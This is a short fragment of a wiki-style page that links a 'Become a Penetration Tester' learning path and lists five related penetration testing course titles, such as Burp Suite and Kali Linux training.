
- [[Become a Penetration Tester]]

## Related Courses

_Courses sharing skills:_

- [[Penetration Testing Essential Training]] — Penetration Testing
- [[Stealth Penetration Testing with Advanced Enumeration]] — Penetration Testing
- [[Burp Suite Essential Training]] — Penetration Testing
- [[Advanced Pen Testing Techniques for Active Directory]] — Penetration Testing
- [[Kali Linux for Advanced Pen Testing and Ethical Hacking]] — Penetration Testing

---

[↑ Back to top](#)